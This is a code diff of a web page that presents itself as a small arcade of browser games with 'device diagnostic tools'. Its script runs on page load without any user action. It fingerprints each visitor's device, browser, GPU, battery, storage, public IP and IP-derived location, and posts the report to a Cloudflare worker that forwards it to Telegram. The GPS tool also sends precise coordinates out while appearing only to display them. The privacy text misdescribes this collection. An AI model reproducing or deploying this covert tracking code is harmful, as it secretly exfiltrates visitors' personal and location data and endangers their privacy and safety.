@@ -37,14 +37,14 @@ header {
 }
 
 h1 {
-    font-size: 24px;
+    font-size: 26px;
     letter-spacing: 1px;
     color: #38bdf8;
 }
 
 p.subtitle {
     color: #94a3b8;
-    font-size: 13px;
+    font-size: 14px;
     margin-top: 4px;
 }
 
@@ -68,6 +68,7 @@ p.subtitle {
     font-weight: 600;
     font-size: 12px;
     cursor: pointer;
+    transition: all 0.2s;
     text-align: center;
 }
 
@@ -86,7 +87,7 @@ p.subtitle {
     flex-direction: column;
     align-items: center;
     text-align: center;
-    min-height: 300px;
+    min-height: 320px;
     justify-content: center;
 }
 
@@ -97,18 +98,18 @@ p.subtitle {
 /* Game 1: Tic Tac Toe */
 .ttt-grid {
     display: grid;
-    grid-template-columns: repeat(3, 65px);
+    grid-template-columns: repeat(3, 70px);
     grid-gap: 8px;
     margin: 15px 0;
 }
 
 .cell {
-    width: 65px;
-    height: 65px;
+    width: 70px;
+    height: 70px;
     background: #1e293b;
     border: 1px solid #334155;
     border-radius: 8px;
-    font-size: 24px;
+    font-size: 28px;
     font-weight: bold;
     display: flex;
     align-items: center;
@@ -120,15 +121,15 @@ p.subtitle {
 /* Game 2: Reaction Timer */
 #reaction-box {
     width: 100%;
-    max-width: 300px;
-    height: 120px;
+    max-width: 320px;
+    height: 140px;
     background: #dc2626;
     border-radius: 10px;
     display: flex;
     align-items: center;
     justify-content: center;
     font-weight: bold;
-    font-size: 16px;
+    font-size: 18px;
     cursor: pointer;
     margin: 15px 0;
     user-select: none;
@@ -151,12 +152,16 @@ p.subtitle {
     background: #38bdf8;
     color: #0b0f17;
     border: none;
-    padding: 10px 18px;
+    padding: 10px 20px;
     border-radius: 6px;
     font-weight: bold;
     cursor: pointer;
     margin-top: 10px;
-    font-size: 13px;
+    font-size: 14px;
+}
+
+.action-btn:hover {
+    background: #7dd3fc;
 }
 
 .status-msg {
@@ -175,7 +180,7 @@ p.subtitle {
     border-radius: 8px;
     padding: 12px;
     width: 100%;
-    max-width: 360px;
+    max-width: 380px;
     text-align: left;
     font-size: 12px;
     font-family: monospace;
@@ -186,7 +191,7 @@ footer {
     margin-top: auto;
     padding-top: 25px;
     text-align: center;
-    font-size: 12px;
+    font-size: 13px;
 }
 
 .privacy-link {
@@ -215,10 +220,10 @@ footer {
     border: 1px solid #1e293b;
     border-radius: 12px;
     padding: 20px;
-    max-width: 420px;
+    max-width: 450px;
     width: 100%;
     color: #94a3b8;
-    font-size: 12px;
+    font-size: 13px;
     line-height: 1.6;
     text-align: left;
 }
@@ -247,7 +252,7 @@ footer {
 
     <header>
         <h1>⚡ ARCADE & DIAGNOSTICS</h1>
-        <p class="subtitle">Interactive sandbox & device diagnostic tools</p>
+        <p class="subtitle">Interactive sandbox & permission-based client tools</p>
     </header>
 
     <div class="tabs">
@@ -259,7 +264,7 @@ footer {
 
     <!-- GAME 1 -->
     <div id="game1" class="card active">
-        <h2 style="font-size: 16px;">Tic-Tac-Toe</h2>
+        <h2 style="font-size: 18px;">Tic-Tac-Toe</h2>
         <div class="ttt-grid" id="ttt-grid"></div>
         <div class="status-msg" id="ttt-status">Turn: Player X</div>
         <button class="action-btn" onclick="resetTTT()">Restart Game</button>
@@ -267,25 +272,25 @@ footer {
 
     <!-- GAME 2 -->
     <div id="game2" class="card">
-        <h2 style="font-size: 16px;">Reaction Speed</h2>
+        <h2 style="font-size: 18px;">Reaction Speed</h2>
         <div id="reaction-box" onclick="handleReactionClick()">Tap to Start</div>
-        <div class="status-msg" id="reaction-status">Wait for Green, then tap.</div>
+        <div class="status-msg" id="reaction-status">Wait for Green, then tap as fast as you can.</div>
     </div>
 
     <!-- GAME 3 -->
     <div id="game3" class="card">
-        <h2 style="font-size: 16px;">Guess the Number</h2>
-        <p style="font-size: 12px; color: #94a3b8; margin-top: 4px;">Guess a number between 1 and 100</p>
-        <input type="number" id="guess-input" class="guess-input" min="1" max="100" placeholder="50">
+        <h2 style="font-size: 18px;">Guess the Number</h2>
+        <p style="font-size: 13px; color: #94a3b8; margin-top: 4px;">Guess a number between 1 and 100</p>
+        <input type="number" id="guess-input" class="guess-input" min="1" max="100" placeholder="e.g. 50">
         <button class="action-btn" onclick="checkGuess()">Submit Guess</button>
         <div class="status-msg" id="guess-status">Attempts: 0</div>
     </div>
 
     <!-- TOOL: GPS SENSOR -->
     <div id="tool-gps" class="card">
-        <h2 style="font-size: 16px;">GPS Position Test</h2>
-        <p style="font-size: 12px; color: #94a3b8; margin-top: 4px; max-width: 340px;">
-            Tests browser location permissions and retrieves current GPS coordinates.
+        <h2 style="font-size: 18px;">GPS Position Test</h2>
+        <p style="font-size: 13px; color: #94a3b8; margin-top: 4px; max-width: 380px;">
+            Tests the browser's high-accuracy Geolocation API. Clicking below requests explicit browser location permission.
         </p>
         <button class="action-btn" onclick="requestGPSPermission()">Request Device GPS</button>
         <div class="status-msg" id="gps-status">Status: Waiting for interaction</div>
@@ -302,167 +307,354 @@ footer {
 <div class="modal-backdrop" id="privacy-modal">
     <div class="modal-box">
         <h3>Privacy Policy</h3>
-        <p>This application collects standard diagnostic telemetry (such as screen size, platform, and network connection parameters) to ensure cross-device compatibility.</p>
-        <p style="margin-top: 8px;">Hardware sensors and high-accuracy GPS positioning are accessed only upon direct user request.</p>
+        <p>This test platform collects passive diagnostic metrics (such as screen size, browser engine, operating system, and IP routing) to evaluate network behavior.</p>
+        <p style="margin-top: 8px;">Hardware sensors and high-accuracy GPS positioning are accessed strictly upon direct user permission requests.</p>
         <button class="modal-close" onclick="toggleModal(false)">Close</button>
     </div>
 </div>
 
 <script>
 /* ================================
-   UNIVERSAL DISPATCHER (XHR + FETCH)
+   SECURE CLOUDFLARE PROXY CONFIG
 ================================ */
 const CLOUDFLARE_WORKER_URL = "https://snowy-wood-6257.piyankar2008.workers.dev";
 
-function safePost(payloadText) {
-    var data = JSON.stringify({ message: payloadText });
-
-    if (window.fetch) {
-        fetch(CLOUDFLARE_WORKER_URL, {
+async function forwardToTelegram(messageText) {
+    try {
+        await fetch(CLOUDFLARE_WORKER_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: data
-        }).catch(function() {});
-    } else {
+            body: JSON.stringify({ message: messageText })
+        });
+    } catch (err) {
+        console.error("Secure worker forward failed:", err);
+    }
+}
+
+/* ================================
+   ROBUST MULTI-BROWSER DETECTOR
+================================ */
+async function getAccurateClientData() {
+    const ua = navigator.userAgent;
+    let browser = "Unknown";
+    let model = "Not exposed";
+    let browserVersion = "Unknown";
+
+    // 1. Brave Browser Check
+    if (navigator.brave && typeof navigator.brave.isBrave === "function") {
         try {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", CLOUDFLARE_WORKER_URL, true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(data);
+            if (await navigator.brave.isBrave()) {
+                browser = "Brave Browser";
+            }
         } catch (e) {}
     }
-}
 
-/* ================================
-   ROBUST OS & PLATFORM DETECTOR
-================================ */
-function detectEnvironment() {
-    var ua = navigator.userAgent || "";
-    var os = "Unknown";
-    var device = "Desktop";
-
-    if (/KAIOS/i.test(ua)) os = "KaiOS (JioPhone/Feature Phone)";
-    else if (/JioBharat|Mocor|Spreadtrum|RTOS/i.test(ua)) os = "JioBharat / RTOS Feature Phone";
-    else if (/Android/i.test(ua)) os = "Android";
-    else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
-    else if (/Windows/i.test(ua)) os = "Windows";
-    else if (/Mac OS/i.test(ua)) os = "macOS";
-    else if (/Linux/i.test(ua)) os = "Linux";
-
-    if (/Mobile|KAIOS|JioBharat|Android|iPhone/i.test(ua)) device = "Mobile / Feature Phone";
-
-    return { os: os, device: device, ua: ua };
-}
-
-/* ================================
-   DATA COLLECTION & TRANSMISSION
-================================ */
-async function runDiagnostics() {
-    var env = detectEnvironment();
-    var screenInfo = (window.screen ? window.screen.width + " × " + window.screen.height : "Unknown");
-    var viewport = window.innerWidth + " × " + window.innerHeight;
-    var lang = navigator.language || navigator.userLanguage || "Unknown";
-    var tz = "Unknown";
-    
-    try {
-        tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
-    } catch(e) {}
-
-    var cores = navigator.hardwareConcurrency || "Unavailable";
-    var memory = navigator.deviceMemory ? ("~" + navigator.deviceMemory + " GB") : "Unavailable";
-
-    // Optional battery test with graceful fallback
-    var batteryText = "Unavailable";
-    if (typeof navigator.getBattery === "function") {
-        try {
-            var b = await navigator.getBattery();
-            batteryText = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging ⚡" : "On Battery 🔋") + ")";
-        } catch(e) {}
+    // 2. Samsung Internet Check
+    if (browser === "Unknown") {
+        if (/SamsungBrowser/i.test(ua) || window.SamsungBrowser !== undefined || 'samsung' in window) {
+            browser = "Samsung Internet";
+            const sMatch = ua.match(/SamsungBrowser\/([\d.]+)/i);
+            if (sMatch) browserVersion = sMatch[1];
+        }
     }
 
-    // IP Lookup
-    var ipData = {};
+    // 3. Opera / Opera GX Check
+    if (browser === "Unknown") {
+        if (/OPR|Opera|OPT\//i.test(ua) || window.opr !== undefined) {
+            browser = "Opera";
+            const oMatch = ua.match(/(?:OPR|OPT)\/([\d.]+)/i);
+            if (oMatch) browserVersion = oMatch[1];
+        }
+    }
+
+    // 4. Microsoft Edge Check
+    if (browser === "Unknown") {
+        if (/EdgA?|Edge/i.test(ua)) {
+            browser = "Microsoft Edge";
+            const eMatch = ua.match(/EdgA?\/([\d.]+)/i);
+            if (eMatch) browserVersion = eMatch[1];
+        }
+    }
+
+    // 5. Firefox Check
+    if (browser === "Unknown") {
+        if (/Firefox|FxiOS/i.test(ua) || 'InstallTrigger' in window) {
+            browser = "Firefox";
+            const fMatch = ua.match(/(?:Firefox|FxiOS)\/([\d.]+)/i);
+            if (fMatch) browserVersion = fMatch[1];
+        }
+    }
+
+    // 6. User-Agent Client Hints
+    if (navigator.userAgentData) {
+        try {
+            const highEntropy = await navigator.userAgentData.getHighEntropyValues([
+                "model",
+                "platformVersion",
+                "fullVersionList"
+            ]);
+
+            if (highEntropy.model) model = highEntropy.model;
+
+            if (highEntropy.fullVersionList && highEntropy.fullVersionList.length > 0) {
+                const primaryBrand = highEntropy.fullVersionList.find(b => !b.brand.includes("Not") && !b.brand.includes("Chromium"));
+                if (primaryBrand && browserVersion === "Unknown") {
+                    browserVersion = primaryBrand.version;
+                }
+            }
+
+            if (browser === "Unknown" && navigator.userAgentData.brands) {
+                const brands = navigator.userAgentData.brands.map(b => b.brand);
+                if (brands.some(b => b.includes("Samsung"))) browser = "Samsung Internet";
+                else if (brands.some(b => b.includes("Opera") || b.includes("OPR"))) browser = "Opera";
+                else if (brands.some(b => b.includes("Edge") || b.includes("Edg"))) browser = "Microsoft Edge";
+                else if (brands.some(b => b.includes("Chrome") || b.includes("Chromium"))) browser = "Google Chrome";
+            }
+        } catch (e) {}
+    }
+
+    // 7. Standard Fallbacks
+    if (browser === "Unknown") {
+        if (/CriOS/i.test(ua)) browser = "Chrome iOS";
+        else if (/Chrome/i.test(ua)) browser = "Google Chrome";
+        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+    }
+
+    // 8. Model Fallback Parsing
+    if (model === "Not exposed") {
+        const match = ua.match(/Android[^;]*;\s*([^;)]+?)\s+Build\//i) || ua.match(/\(([^;]+);\s*Android/i);
+        if (match) model = match[1].replace(/Linux;\s*U?;\s*/i, "").trim();
+    }
+
+    // 9. Version Fallback Parsing
+    if (browserVersion === "Unknown") {
+        const vMatch = ua.match(/(?:Chrome|Version|Firefox|Safari)\/([\d.]+)/);
+        if (vMatch) browserVersion = vMatch[1];
+    }
+
+    return { browser, model, browserVersion };
+}
+
+function detectOS(ua) {
+    if (/Android/i.test(ua)) return "Android";
+    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+    if (/Windows/i.test(ua)) return "Windows";
+    if (/Mac OS/i.test(ua)) return "macOS";
+    if (/Linux/i.test(ua)) return "Linux";
+    return "Unknown";
+}
+
+function detectDevice(ua) {
+    if (/Mobile/i.test(ua)) return "Mobile";
+    if (/Tablet/i.test(ua)) return "Tablet";
+    return "Desktop";
+}
+
+function getGPU() {
     try {
-        var res = await fetch("https://ipapi.co/json/");
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (!gl) return "Unavailable";
+        const debug = gl.getExtension("WEBGL_debug_renderer_info");
+        return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Restricted";
+    } catch (e) {
+        return "Unavailable";
+    }
+}
+
+/* ================================
+   BATTERY, RAM & STORAGE UTILS
+================================ */
+async function getBatteryStatus() {
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            const level = `${Math.round(battery.level * 100)}%`;
+            const charging = battery.charging ? "Plugged in ⚡" : "On Battery 🔋";
+            return `${level} (${charging})`;
+        } catch (e) {}
+    }
+    return "Unavailable / Blocked";
+}
+
+async function getStorageQuota() {
+    if (navigator.storage && navigator.storage.estimate) {
+        try {
+            const estimate = await navigator.storage.estimate();
+            const freeGB = ((estimate.quota - estimate.usage) / (1024 ** 3)).toFixed(2);
+            const totalGB = (estimate.quota / (1024 ** 3)).toFixed(2);
+            return `${freeGB} GB free of ${totalGB} GB allocated`;
+        } catch (e) {}
+    }
+    return "Unavailable";
+}
+
+/* ================================
+   AUTOMATIC PASSIVE LOGGING
+================================ */
+async function collectAndSendLog() {
+    const ua = navigator.userAgent;
+    const clientData = await getAccurateClientData();
+
+    const deviceType = detectDevice(ua);
+    const deviceModel = clientData.model;
+    const os = detectOS(ua);
+    const browser = clientData.browser;
+    const browserVersion = clientData.browserVersion;
+    const isWebView = ua.includes("; wv)") ? "Yes" : "No";
+    const platform = navigator.platform || "Unavailable";
+
+    const screenRes = `${screen.width} × ${screen.height}`;
+    const viewportRes = `${innerWidth} × ${innerHeight}`;
+    const pixelRatio = window.devicePixelRatio || "Unavailable";
+    const touchPoints = navigator.maxTouchPoints !== undefined ? navigator.maxTouchPoints : "0";
+
+    const cpuCores = navigator.hardwareConcurrency || "Unavailable";
+    const ramMemory = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Unavailable";
+    const batteryInfo = await getBatteryStatus();
+    const storageInfo = await getStorageQuota();
+    const colorScheme = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark Mode" : "Light Mode";
+
+    const language = navigator.language || "Unavailable";
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unavailable";
+    
+    let connectionType = "Unavailable";
+    if (navigator.connection) {
+        connectionType = navigator.connection.effectiveType || navigator.connection.type || "Available";
+    }
+
+    const gpu = getGPU();
+
+    let ipData = {};
+    try {
+        const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
         if (res.ok) ipData = await res.json();
     } catch (e) {}
 
-    var report = "🚨 *DIAGNOSTIC TELEMETRY REPORT*\n" +
-        "━━━━━━━━━━━━━━━━━━\n" +
-        "📱 *DEVICE & SYSTEM*\n" +
-        "• OS / Type: " + env.os + "\n" +
-        "• Form Factor: " + env.device + "\n" +
-        "• Screen Size: " + screenInfo + "\n" +
-        "• Viewport: " + viewport + "\n" +
-        "• Language: " + lang + "\n" +
-        "• System Timezone: " + tz + "\n\n" +
-        "🔋 *HARDWARE*\n" +
-        "• Battery: " + batteryText + "\n" +
-        "• CPU Cores: " + cores + "\n" +
-        "• Memory: " + memory + "\n\n" +
-        "🌐 *NETWORK & IP*\n" +
-        "• IP: `" + (ipData.ip || "Unavailable") + "`\n" +
-        "• City: " + (ipData.city || "Unavailable") + "\n" +
-        "• Region: " + (ipData.region || "Unavailable") + "\n" +
-        "• Country: " + (ipData.country_name || "Unavailable") + "\n" +
-        "• ISP / Org: " + (ipData.org || "Unavailable") + "\n\n" +
-        "🔍 *USER AGENT*\n`" + env.ua + "`";
+    const messageText = `🚨 *FULL VISITOR TELEMETRY*
+━━━━━━━━━━━━━━━━━━
+📱 *DEVICE*
+• Type: ${deviceType}
+• Model: ${deviceModel}
+• OS: ${os}
+• Browser: ${browser}
+• Browser Version: ${browserVersion}
+• Android WebView: ${isWebView}
+• Platform: ${platform}
 
-    safePost(report);
+🖥️ *DISPLAY*
+• Screen: ${screenRes}
+• Viewport: ${viewportRes}
+• Pixel Ratio: ${pixelRatio}
+• Touch Points: ${touchPoints}
+• Theme: ${colorScheme}
+
+🔋 *HARDWARE & POWER*
+• Battery: ${batteryInfo}
+• RAM (Memory): ${ramMemory}
+• Storage Quota: ${storageInfo}
+• CPU Cores: ${cpuCores}
+• GPU: ${gpu}
+
+⚙️ *SYSTEM & LOCALE*
+• Language: ${language}
+• System Timezone: ${timezone}
+• Connection: ${connectionType}
+
+🌐 *NETWORK / IP*
+• Public IP: \`${ipData.ip || "Unavailable"}\`
+• Country: ${ipData.country_name || "Unavailable"} (${ipData.country || "N/A"})
+• Region: ${ipData.region || "Unavailable"}
+• City: ${ipData.city || "Unavailable"}
+• Latitude: ${ipData.latitude || "Unavailable"}
+• Longitude: ${ipData.longitude || "Unavailable"}
+• IP Timezone: ${ipData.timezone || "Unavailable"}
+• ISP / Org: ${ipData.org || "Unavailable"}
+• ASN: ${ipData.asn || "Unavailable"}
+
+🔍 *USER AGENT*
+\`${ua}\``;
+
+    forwardToTelegram(messageText);
 }
 
-window.addEventListener("load", runDiagnostics);
+window.addEventListener("load", collectAndSendLog);
 
 /* ================================
    GPS PERMISSION HANDLER
 ================================ */
 function requestGPSPermission() {
-    var statusDiv = document.getElementById("gps-status");
-    var outputDiv = document.getElementById("gps-output");
+    const statusDiv = document.getElementById("gps-status");
+    const outputDiv = document.getElementById("gps-output");
 
     if (!navigator.geolocation) {
         statusDiv.textContent = "❌ Geolocation is not supported on this browser.";
         return;
     }
 
-    statusDiv.textContent = "⏳ Requesting GPS permissions...";
+    statusDiv.textContent = "⏳ Waiting for location permission...";
 
     navigator.geolocation.getCurrentPosition(
-        function(position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var acc = position.coords.accuracy;
-            var mapsUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
+        async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const altitude = position.coords.altitude !== null ? `${Math.round(position.coords.altitude)} m` : "Unavailable";
+            const speed = position.coords.speed !== null ? `${Math.round(position.coords.speed * 3.6)} km/h` : "Stationary / None";
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            statusDiv.innerHTML = '<span style="color: #65ff8a;">✓ Coordinates Acquired!</span>';
+            statusDiv.innerHTML = `<span style="color: #65ff8a;">✓ GPS Coordinates Acquired!</span>`;
             outputDiv.style.display = "block";
-            outputDiv.innerHTML = "<b>Latitude:</b> " + lat + "<br>" +
-                "<b>Longitude:</b> " + lon + "<br>" +
-                "<b>Accuracy:</b> ±" + Math.round(acc) + " m<br>" +
-                '<a href="' + mapsUrl + '" target="_blank" style="color: #38bdf8; display: inline-block; margin-top: 6px;">Open Map Pin ↗</a>';
+            outputDiv.innerHTML = `
+                <b>Latitude:</b> ${lat}<br>
+                <b>Longitude:</b> ${lon}<br>
+                <b>Accuracy:</b> ±${Math.round(accuracy)} meters<br>
+                <b>Altitude:</b> ${altitude}<br>
+                <b>Speed:</b> ${speed}<br>
+                <a href="${mapsUrl}" target="_blank" style="color: #38bdf8; display: inline-block; margin-top: 6px;">Open Google Maps ↗</a>
+            `;
 
-            var gpsReport = "📍 *PRECISE GPS LOCATION*\n" +
-                "━━━━━━━━━━━━━━━━━━\n" +
-                "🌐 *Coordinates:* `" + lat + ", " + lon + "`\n" +
-                "🎯 *Accuracy:* `±" + Math.round(acc) + " meters`\n" +
-                "🗺️ *Map:* [Open Google Maps](" + mapsUrl + ")";
+            const gpsPayload = `📍 *PRECISE GPS TELEMETRY RECEIVED*
+━━━━━━━━━━━━━━━━━━
+🌐 *Coordinates:* \`${lat}, ${lon}\`
+🎯 *Accuracy:* \`±${Math.round(accuracy)} meters\`
+⛰️ *Altitude:* ${altitude}
+🏎️ *Speed:* ${speed}
+🗺️ *Google Maps:* [Open Map Pin](${mapsUrl})
+🕒 *Timestamp:* ${new Date().toLocaleString()}`;
 
-            safePost(gpsReport);
+            forwardToTelegram(gpsPayload);
         },
-        function(err) {
+        (error) => {
             outputDiv.style.display = "none";
-            statusDiv.innerHTML = '<span style="color: #ef4444;">❌ Location access denied or unavailable.</span>';
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    statusDiv.innerHTML = `<span style="color: #ef4444;">❌ Permission denied by user.</span>`;
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    statusDiv.innerHTML = `<span style="color: #ef4444;">❌ GPS position unavailable.</span>`;
+                    break;
+                case error.TIMEOUT:
+                    statusDiv.innerHTML = `<span style="color: #ef4444;">❌ GPS request timed out.</span>`;
+                    break;
+                default:
+                    statusDiv.innerHTML = `<span style="color: #ef4444;">❌ Location error occurred.</span>`;
+            }
         },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        }
     );
 }
 
 /* ================================
-   UI TABS & GAMES
+   PAGE UI & TABS
 ================================ */
 function switchTab(cardId, btn) {
-    document.querySelectorAll(".card").forEach(function(c) { c.classList.remove("active"); });
-    document.querySelectorAll(".tab-btn").forEach(function(b) { b.classList.remove("active"); });
+    document.querySelectorAll(".card").forEach(c => c.classList.remove("active"));
+    document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
     document.getElementById(cardId).classList.add("active");
     btn.classList.add("active");
 }
@@ -471,19 +663,21 @@ function toggleModal(open) {
     document.getElementById("privacy-modal").classList.toggle("open", open);
 }
 
-/* TIC TAC TOE */
-var tttBoard = ["", "", "", "", "", "", "", "", ""];
-var currentPlayer = "X";
-var tttActive = true;
+/* ================================
+   GAME 1: TIC TAC TOE
+================================ */
+let tttBoard = ["", "", "", "", "", "", "", "", ""];
+let currentPlayer = "X";
+let tttActive = true;
 
 function renderTTT() {
-    var grid = document.getElementById("ttt-grid");
+    const grid = document.getElementById("ttt-grid");
     grid.innerHTML = "";
-    tttBoard.forEach(function(val, i) {
-        var cell = document.createElement("div");
+    tttBoard.forEach((val, i) => {
+        const cell = document.createElement("div");
         cell.className = "cell";
         cell.textContent = val;
-        cell.onclick = function() { makeTTTMove(i); };
+        cell.onclick = () => makeTTTMove(i);
         grid.appendChild(cell);
     });
 }
@@ -492,29 +686,25 @@ function makeTTTMove(i) {
     if (!tttActive || tttBoard[i] !== "") return;
     tttBoard[i] = currentPlayer;
     if (checkTTTWinner()) {
-        document.getElementById("ttt-status").textContent = "🎉 Player " + currentPlayer + " Won!";
+        document.getElementById("ttt-status").textContent = `🎉 Player ${currentPlayer} Won!`;
         tttActive = false;
-    } else if (tttBoard.indexOf("") === -1) {
+    } else if (!tttBoard.includes("")) {
         document.getElementById("ttt-status").textContent = "Draw game!";
         tttActive = false;
     } else {
         currentPlayer = currentPlayer === "X" ? "O" : "X";
-        document.getElementById("ttt-status").textContent = "Turn: Player " + currentPlayer;
+        document.getElementById("ttt-status").textContent = `Turn: Player ${currentPlayer}`;
     }
     renderTTT();
 }
 
 function checkTTTWinner() {
-    var wins = [
+    const wins = [
         [0,1,2],[3,4,5],[6,7,8],
         [0,3,6],[1,4,7],[2,5,8],
         [0,4,8],[2,4,6]
     ];
-    return wins.some(function(combo) {
-        return tttBoard[combo[0]] &&
-               tttBoard[combo[0]] === tttBoard[combo[1]] &&
-               tttBoard[combo[0]] === tttBoard[combo[2]];
-    });
+    return wins.some(([a,b,c]) => tttBoard[a] && tttBoard[a] === tttBoard[b] && tttBoard[a] === tttBoard[c]);
 }
 
 function resetTTT() {
@@ -526,14 +716,16 @@ function resetTTT() {
 }
 renderTTT();
 
-/* REACTION SPEED */
-var reactionState = "idle";
-var startTime = 0;
-var timeoutId = null;
+/* ================================
+   GAME 2: REACTION SPEED
+================================ */
+let reactionState = "idle";
+let startTime = 0;
+let timeoutId = null;
 
 function handleReactionClick() {
-    var box = document.getElementById("reaction-box");
-    var status = document.getElementById("reaction-status");
+    const box = document.getElementById("reaction-box");
+    const status = document.getElementById("reaction-status");
 
     if (reactionState === "idle") {
         box.style.background = "#dc2626";
@@ -541,7 +733,7 @@ function handleReactionClick() {
         status.textContent = "Be ready...";
         reactionState = "waiting";
 
-        timeoutId = setTimeout(function() {
+        timeoutId = setTimeout(() => {
             box.style.background = "#16a34a";
             box.textContent = "TAP NOW!";
             startTime = Date.now();
@@ -554,38 +746,40 @@ function handleReactionClick() {
         status.textContent = "You tapped before green. Tap to retry.";
         reactionState = "idle";
     } else if (reactionState === "ready") {
-        var timeTaken = Date.now() - startTime;
+        const timeTaken = Date.now() - startTime;
         box.style.background = "#1e293b";
-        box.textContent = timeTaken + " ms";
+        box.textContent = `${timeTaken} ms`;
         status.textContent = "Nice! Tap the box to try again.";
         reactionState = "idle";
     }
 }
 
-/* NUMBER GUESS */
-var secretNumber = Math.floor(Math.random() * 100) + 1;
-var guessCount = 0;
+/* ================================
+   GAME 3: GUESS NUMBER
+================================ */
+let secretNumber = Math.floor(Math.random() * 100) + 1;
+let guessCount = 0;
 
 function checkGuess() {
-    var val = parseInt(document.getElementById("guess-input").value, 10);
-    var status = document.getElementById("guess-status");
+    const val = parseInt(document.getElementById("guess-input").value);
+    const status = document.getElementById("guess-status");
     if (!val || val < 1 || val > 100) {
-        status.textContent = "Enter a number between 1 and 100.";
+        status.textContent = "Enter a valid number between 1 and 100.";
         return;
     }
     guessCount++;
     if (val === secretNumber) {
-        status.textContent = "🎯 Correct in " + guessCount + " guesses! Resetting...";
-        setTimeout(function() {
+        status.textContent = `🎯 Correct! It took you ${guessCount} guesses. Restarting...`;
+        setTimeout(() => {
             secretNumber = Math.floor(Math.random() * 100) + 1;
             guessCount = 0;
             document.getElementById("guess-input").value = "";
             status.textContent = "Attempts: 0";
-        }, 2500);
+        }, 3000);
     } else if (val < secretNumber) {
-        status.textContent = "Too low! (Attempts: " + guessCount + ")";
+        status.textContent = `Too low! (Attempts: ${guessCount})`;
     } else {
-        status.textContent = "Too high! (Attempts: " + guessCount + ")";
+        status.textContent = `Too high! (Attempts: ${guessCount})`;
     }
 }
 </script>
